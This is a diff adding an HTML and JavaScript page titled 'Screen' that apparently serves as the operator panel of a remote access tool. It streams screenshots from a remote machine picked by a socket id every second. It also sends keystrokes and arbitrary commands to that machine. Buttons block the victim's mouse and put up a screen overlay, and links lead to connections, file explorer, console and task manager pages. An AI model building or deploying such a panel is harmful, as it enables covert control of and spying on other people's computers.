@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<title>Screen</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://i.imgur.com/CsVKESW.jpg">
+	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+	<style type="text/css">
+		th {
+			background-color: lightblue;
+		}
+
+		table {
+			border-collapse: collapse;
+			width: 100%;
+		}
+
+		table,
+		th,
+		td {
+			border: 1px solid black;
+		}
+
+		th,
+		td {
+			padding: 10px;
+			text-align: center;
+		}
+
+		tr:hover {
+			background-color: lightgray;
+			cursor: pointer;
+		}
+
+		header-table {
+			position: absolute;
+		}
+
+		.headbtn {
+			padding: 10px 20px;
+			background-color: #007bff;
+			color: #fff;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+		}
+
+		.headbtn:hover {
+			background-color: green;
+		}
+
+		.headfield {
+			padding: 10px 20px;
+			text-decoration: none;
+			border-radius: 5px;
+			margin-left: 4px;
+		}
+
+		.logo {
+			max-width: 100px;
+		}
+
+		body {
+			font-family: "Roboto", sans-serif;
+			background-color: #f7f7f7;
+			padding: 20px;
+		}
+
+		.title {
+			text-align: center;
+			flex-grow: 1;
+		}
+
+		.header {
+			display: flex;
+			justify-content: space-between;
+			align-items: center;
+			padding: 20px;
+		}
+
+		#screenimg {
+			margin: 0;
+			padding: 0;
+			height: 90vh;
+		}
+	</style>
+</head>
+
+<body>
+	<div class="header">
+		<img src="https://i.imgur.com/CsVKESW.jpg" alt="Lgo" class="logo">
+		<h1 class="title">Screen</h1>
+		<a href="connections?" class="headbtn">Connections</a>
+		<a href="explorer?" class="headbtn">Explorer</a>
+		<a href="console?" class="headbtn">Console</a>
+		<a href="taskmgr?" class="headbtn">Taskmgr</a>
+		<a href="license?" class="headbtn">License</a>
+	</div>
+	<img id="screenimg">
+	<div class="controls">
+		<button id="overlay" class="headbtn">Overlay</button>
+		<button id="mouse" class="headbtn">Block mouse</button>
+		<button id="toggle" class="headbtn">Toggle Screen</button>
+		<input type="text" id="keysInput" class="headfield" placeholder="Enter keys to press">
+		<button id="pressbtn" class="headbtn">Press</button>
+		<input type="text" id="commandInput" class="headfield" placeholder="Enter command...">
+		<button id="execbtn" class="headbtn">Execute</button>
+	</div>
+</body>
+<script>
+	const socket = window.location.href.split("?socket=")[1];
+	updateLinks();
+	setInterval(updateScreen, 1000);
+	document.getElementById("overlay").addEventListener("click", function () {
+		executeCMD("/overlay");
+	});
+	document.getElementById("mouse").addEventListener("click", function () {
+		executeCMD("/blockmouse");
+	});
+	document.getElementById("toggle").addEventListener("click", function () {
+		executeCMD("/screen");
+	});
+	document.getElementById("execbtn").addEventListener("click", function () {
+		var cmd = document.getElementById("commandInput").value;
+		executeCMD(cmd);
+	});
+	document.getElementById("pressbtn").addEventListener("click", function () {
+		var keys = document.getElementById("keysInput").value;
+		let url = "/api/presskeys?socket=" + socket + "&keys=" + keys;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	});
+
+	function updateScreen() {
+		let url = "/api/screen?socket=" + socket;
+		fetch(url)
+			.then(response => response.blob())
+			.then(blob => {
+				const imageUrl = URL.createObjectURL(blob);
+				const imageElement = document.getElementById("screenimg");
+				imageElement.src = imageUrl;
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	}
+	function executeCMD(cmd) {
+		let url = "/api/cmd?socket=" + socket + "&command=" + cmd;
+		fetch(url)
+			.then(response => response.json())
+			.then((data) => {
+				Swal.fire("Command sent. Answer:" + JSON.stringify(data), "", "success");
+			})
+			.catch(error => {
+				Swal.fire("Error: " + error.toString(), "", "error");
+			});
+	}
+
+	function updateLinks() {
+		let linkElements = document.querySelectorAll(".headbtn");
+		linkElements.forEach((linkElement) => {
+			let currentHref = linkElement.getAttribute("href");
+			if (currentHref) {
+				let newUrl = currentHref.split("?")[0];
+				linkElement.setAttribute("href", newUrl + "?socket=" + socket);
+			}
+		});
+	}
+</script>
+
+</html>
